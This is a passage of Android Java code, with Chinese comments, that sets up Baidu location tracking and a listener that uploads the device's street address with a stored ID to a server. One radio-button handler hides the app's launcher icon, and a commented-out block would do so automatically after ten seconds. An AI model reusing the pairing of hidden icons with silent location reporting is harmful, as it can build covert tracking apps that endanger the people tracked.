        mLocationClient.registerLocationListener(myListener);    //注册监听函数
        LocationClientOption option = new LocationClientOption();
        option.setLocationMode(LocationClientOption.LocationMode.Battery_Saving
        );//可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        option.setCoorType("bd09ll");//可选，默认gcj02，设置返回的定位结果坐标系
//        int span = 1000;
//        option.setScanSpan(span);//可选，默认0，即仅定位一次，设置发起定位请求的间隔需要大于等于1000ms才是有效的
        option.setIsNeedAddress(true);//可选，设置是否需要地址信息，默认不需要
        option.setOpenGps(true);//可选，默认false,设置是否使用gps
        option.setLocationNotify(true);//可选，默认false，设置是否当GPS有效时按照1S/1次频率输出GPS结果
        option.setIsNeedLocationDescribe(true);//可选，默认false，设置是否需要位置语义化结果，可以在BDLocation
        // .getLocationDescribe里得到，结果类似于“在北京天安门附近”
        option.setIsNeedLocationPoiList(true);//可选，默认false，设置是否需要POI结果，可以在BDLocation.getPoiList里得到
        option.setIgnoreKillProcess(false);//可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop
        // 的时候杀死这个进程，默认不杀死
        option.SetIgnoreCacheException(false);//可选，默认false，设置是否收集CRASH信息，默认收集
        option.setEnableSimulateGps(false);//可选，默认false，设置是否需要过滤GPS仿真结果，默认需要
        mLocationClient.setLocOption(option);
        //开启定位
        mLocationClient.start();
        initSendMsg(ShareKey.START_LOCATION_CALLBACK, "");

    }

    @Override
    public void onCheckedChanged(RadioGroup radioGroup, int checkedId) {
        switch (checkedId) {
            case R.id.rb1:
                currentFragment = 0;

                break;
            case R.id.rb2:
                currentFragment = 1;
//                PackageManager packageManager = getPackageManager();
//                PackageManager p = getPackageManager();
//                p.setComponentEnabledSetting(getComponentName(),
//                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

                //隐藏桌面图标
//                new Thread(){
//                    @Override
//                    public void run() {
//                        SystemClock.sleep(10000);//十秒后桌面图标影藏
//                        Log.i(TAG, "隐藏桌面图标: ");
//                        PackageManager pm=getPackageManager();
//                        pm.setComponentEnabledSetting(getComponentName(),
//                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                                PackageManager.DONT_KILL_APP);//影藏图标
//                    }
//                }.start();

        break;
        case R.id.rb3:
        currentFragment = 2;

            PackageManager mPackageManagers=getPackageManager();
            mPackageManagers.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        break;
    }
        viewPager.setCurrentItem(currentFragment);
}


public class MyLocationListener extends BDAbstractLocationListener {
    @Override
    public void onReceiveLocation(BDLocation location) {
        String addr = location.getAddrStr();    //获取详细地址信息


        String id = SharedPreferencesHelper.getInstance(mActivity).getString(ID, "");
        Http.with(mActivity).setObservable(Http.getApiService(ApiService.class).sendLocation(id,
                addr))
                .setDataListener(new HttpCallBack() {
                    @Override
                    public void netOnSuccess(Map<String, Object> data) {
                        //结束成功回调
                        initSendMsg(ShareKey.END_LOCATION_CALLBACK, "");
                    }
                });


    }
}


}
